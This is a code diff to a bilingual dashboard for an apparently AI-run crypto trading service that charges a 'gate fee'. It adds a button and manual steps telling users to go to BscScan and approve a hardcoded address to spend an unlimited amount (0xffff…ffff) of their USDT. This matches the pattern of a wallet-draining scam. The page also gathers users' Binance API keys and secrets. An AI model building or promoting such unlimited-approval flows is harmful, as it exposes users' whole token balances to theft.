@@ -324,6 +324,17 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
         <button class="btn" id="wfApproveBtn" onclick="wfDoApprove()" style="width:100%;padding:13px;font-size:15px;border:none;border-radius:8px;cursor:pointer;background:#238636;color:#fff;font-weight:700">
           <span data-i18n="gates.approveUsdt">授权 USDT</span>
         </button>
+        <button class="btn" id="wfCheckBtn" onclick="wfCheckChainStatus()" style="width:100%;padding:10px;margin-top:8px;font-size:13px;border:1px solid #30363d;border-radius:8px;cursor:pointer;background:transparent;color:#58a6ff">
+          <span data-i18n="gates.checkStatus">我已授权，检查链上状态</span>
+        </button>
+        <div style="margin-top:10px;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:8px;font-size:.72em;color:#8b949e;line-height:1.5">
+          <div style="color:#d29922;font-weight:700;margin-bottom:4px" data-i18n="gates.bscScanTip">如果钱包未弹窗，可手动授权：</div>
+          1. 复制授权地址: <code style="color:#58a6ff;font-size:.9em" id="traderAddrDisplay">--</code><br>
+          2. 在 BscScan 打开 USDT 合约的 Write Contract<br>
+          3. approve(spender, amount)<br>
+          4. amount 填: <code style="font-size:.85em">0xffffffff...ffff</code>
+          <a id="bscScanLink" href="#" target="_blank" style="color:#58a6ff;text-decoration:underline;font-size:.9em;display:block;margin-top:6px" data-i18n="gates.bscScanLink">前往 BscScan 授权 &rarr;</a>
+        </div>
       </div>
       
       <!-- 步骤3：授权中/结果 -->
@@ -475,7 +486,7 @@ zh:{lang:'中文',
     noPos:'空仓',entry:'开仓价',mark:'标记价',size:'仓位',lev:'杠杆',pnl:'盈亏'},
   guide:{title:'币安 API Key 创建教程',s1:'打开币安APP（或访问 binance.com）→ 登录账户',s2:'点击右下角「用户中心」（人形图标）→ 向下滑动找到「API管理」',s3:'点击「创建API」→ 选择「系统生成」→ 输入标签名（如：quant）',s4:'权限设置：✅ 勾选「启用交易」  ❌ 不要勾选「启用提现」',s5:'完成安全验证 → 创建成功 → 点击「查看」→ 复制 API Key 和 Secret Key',s6:'回到本页面 → 点击「已有 Key，直接粘贴」→ 粘贴 Key 和 Secret → 点击「验证并绑定」',warn1:'安全提醒：不要勾选提现权限！AI 只需交易权限，不能动用您的资金。',openBinance:'直接打开币安 API 管理页面',tip:'如果无法打开，请使用 VPN 或在币安APP中操作'},
   api:{title:'绑定 Binance API Key',desc:'绑定后 AI 自动帮你在币安交易。资金始终在你自己的币安账户。盖茨费只在盈利后收取，无盈利不收费。',c1t:'仅交易权限',c1d:'无需提现权限',c2t:'AI 7x24 交易',c2d:'自动买卖',c3t:'随时解绑',c3d:'一键停止',goto:'打开币安创建 API Key',paste:'已有 Key，直接粘贴',bind:'验证并绑定',connected:'已绑定 Binance API · CEX 模式已开启',binding:'绑定中...',bindOk:'绑定成功！',bindErr:'绑定失败，请检查 Key'},
-  gates:{title:'盖茨费余额',sub:'仅在盈利时收取，无盈利不收费',lowTitle:'盖茨费余额不足，交易已暂停',lowDesc:'请在注册钱包中充值 USDT (BEP-20) 作为盖茨费储备。充值后交易将自动恢复。',walletLabel:'支付钱包',approveTitle:'绑定钱包并授权盖茨费',approveDesc:'连接您的 BSC 钱包并授权 USDT，系统才能在盈利时自动收取盖茨费。全程在仪表盘内完成，安全透明。',connectWallet:'连接 BSC 钱包',approveUsdt:'授权 USDT',connectedWallet:'已连接钱包'},
+  gates:{title:'盖茨费余额',sub:'仅在盈利时收取，无盈利不收费',lowTitle:'盖茨费余额不足，交易已暂停',lowDesc:'请在注册钱包中充值 USDT (BEP-20) 作为盖茨费储备。充值后交易将自动恢复。',walletLabel:'支付钱包',approveTitle:'绑定钱包并授权盖茨费',approveDesc:'连接您的 BSC 钱包并授权 USDT，系统才能在盈利时自动收取盖茨费。全程在仪表盘内完成，安全透明。',connectWallet:'连接 BSC 钱包',approveUsdt:'授权 USDT',connectedWallet:'已连接钱包',checkStatus:'我已授权，检查链上状态',bscScanTip:'如果钱包未弹窗，可手动授权：',bscScanLink:'前往 BscScan 授权 →'},
   strat:{title:'交易策略',con:'保守',conD:'低风险 稳健',bal:'平衡',balD:'推荐 风险适中',agg:'激进',aggD:'高收益 高风险',pairs:'交易对',winRate:'胜率',maxDD:'最大回撤',holding:'持仓时间',risk:'风险等级',bt:'策略回测',btReturn:'30天收益',btWinRate:'胜率',btTrades:'交易次数',btProfit:'平均盈利',btRun:'运行回测',btRunning:'计算中...'},
   ctrl:{start:'开启交易',stop:'停止交易',refresh:'刷新'},
   set:{title:'交易设置',amount:'投入金额 (USDT)',strategy:'策略',maxSingle:'单笔限额 (USDT)',daily:'日限额 (USDT)',save:'保存',saved:'设置已保存'},
@@ -490,7 +501,7 @@ en:{lang:'EN',
     noPos:'Flat',entry:'Entry',mark:'Mark',size:'Size',lev:'Leverage',pnl:'P&L'},
   guide:{title:'Binance API Key Tutorial',s1:'Open Binance App (or visit binance.com) → Login',s2:'Tap "User Center" (person icon) → Scroll to "API Management"',s3:'Tap "Create API" → "System Generated" → Name it (e.g. quant)',s4:'Permissions: ✅ Enable Trading ❌ Do NOT Enable Withdrawal',s5:'Complete verification → API created → Tap "View" → Copy API Key & Secret Key',s6:'Return here → Tap "Have Key? Paste Here" → Paste Key & Secret → "Verify & Bind"',warn1:'Security Warning: Do NOT enable withdrawal! AI only needs trading permission.',openBinance:'Open Binance API Management Page',tip:'If blocked, use VPN or operate in Binance App'},
   api:{title:'Bind Binance API Key',desc:'AI trades on Binance for you. Funds stay in your account. Gate fee only charged on profits, no fee if no profit.',c1t:'Trading Only',c1d:'No Withdrawal Needed',c2t:'AI 24/7',c2d:'Auto Trade',c3t:'Unbind Anytime',c3d:'One Click Stop',goto:'Open Binance to Create API Key',paste:'Have Key? Paste Here',bind:'Verify & Bind',connected:'Binance API Bound · CEX Mode Active',binding:'Binding...',bindOk:'Bound Successfully!',bindErr:'Binding failed, check your keys'},
-  gates:{title:'Gate Fee Balance',sub:'Only charged on profits, no fee if no profit',lowTitle:'Gate fee insufficient, trading paused',lowDesc:'Please recharge USDT (BEP-20) in your registered wallet as gate fee reserve. Trading will auto-resume after recharge.',walletLabel:'Payment Wallet',approveTitle:'Bind Wallet & Authorize',approveDesc:'Connect your BSC wallet and approve USDT so the system can collect gate fees on profits. Done right here in the dashboard.',connectWallet:'Connect BSC Wallet',approveUsdt:'Approve USDT',connectedWallet:'Connected Wallet'},
+  gates:{title:'Gate Fee Balance',sub:'Only charged on profits, no fee if no profit',lowTitle:'Gate fee insufficient, trading paused',lowDesc:'Please recharge USDT (BEP-20) in your registered wallet as gate fee reserve. Trading will auto-resume after recharge.',walletLabel:'Payment Wallet',approveTitle:'Bind Wallet & Authorize',approveDesc:'Connect your BSC wallet and approve USDT so the system can collect gate fees on profits. Done right here in the dashboard.',connectWallet:'Connect BSC Wallet',approveUsdt:'Approve USDT',connectedWallet:'Connected Wallet',checkStatus:'Already approved, check on-chain status',bscScanTip:'If wallet popup fails, you can manually approve:',bscScanLink:'Open BscScan to approve →'},
   strat:{title:'Trading Strategy',con:'Conservative',conD:'Low Risk',bal:'Balanced',balD:'Recommended',agg:'Aggressive',aggD:'High Return',pairs:'Trading Pairs',winRate:'Win Rate',maxDD:'Max Drawdown',holding:'Holding Time',risk:'Risk Level',bt:'Strategy Backtest',btReturn:'30d Return',btWinRate:'Win Rate',btTrades:'Trades',btProfit:'Avg Profit',btRun:'Run Backtest',btRunning:'Calculating...'},
   ctrl:{start:'Start Trading',stop:'Stop Trading',refresh:'Refresh'},
   set:{title:'Trading Settings',amount:'Invest Amount (USDT)',strategy:'Strategy',maxSingle:'Max Per Trade (USDT)',daily:'Daily Limit (USDT)',save:'Save',saved:'Settings saved'},
@@ -1292,6 +1303,48 @@ async function wfDoApprove() {
     wfShowStep(2);
   }
 }
+
+// 检查链上授权状态（用户已在其他地方授权时用）
+async function wfCheckChainStatus() {
+  var btn = document.getElementById('wfCheckBtn');
+  if (btn) { btn.disabled = true; btn.textContent = '正在检查链上状态...'; }
+  wfShowStep(3);
+  var msgEl = document.getElementById('wfStatusMsg');
+  if (msgEl) {
+    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>正在查询链上授权状态...';
+    msgEl.style.color = '#58a6ff';
+  }
+  try {
+    var tk = getToken();
+    var resp = await fetch('/api/vault/approve-confirmed', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk },
+      body: JSON.stringify({ txHash: 'already-approved' })
+    });
+    var data = await resp.json();
+    if (data.success) {
+      if (msgEl) { msgEl.innerHTML = '✅ 链上已授权！盖茨费系统已激活'; msgEl.style.color = '#3fb950'; }
+      setTimeout(function() { refreshAll(); }, 1500);
+    } else {
+      if (msgEl) { msgEl.innerHTML = '❌ ' + (data.error || '链上未找到授权记录'); msgEl.style.color = '#f85149'; }
+      if (btn) { btn.disabled = false; btn.textContent = '我已授权，检查链上状态'; }
+      wfShowStep(2);
+    }
+  } catch(e) {
+    if (msgEl) { msgEl.textContent = '检查失败: ' + (e.message || '网络错误'); msgEl.style.color = '#f85149'; }
+    if (btn) { btn.disabled = false; btn.textContent = '我已授权，检查链上状态'; }
+    wfShowStep(2);
+  }
+}
+
+// 初始化 BscScan 链接和 trader 地址显示
+(function() {
+  var traderAddr = '0xe6DDF0771c7610dBA77eB5a07ba7771DD7F5e91e';
+  var el = document.getElementById('traderAddrDisplay');
+  if (el) el.textContent = traderAddr.slice(0,10) + '...' + traderAddr.slice(-4);
+  var link = document.getElementById('bscScanLink');
+  if (link) link.href = 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract';
+})();
 </script>
 </body>
 </html>
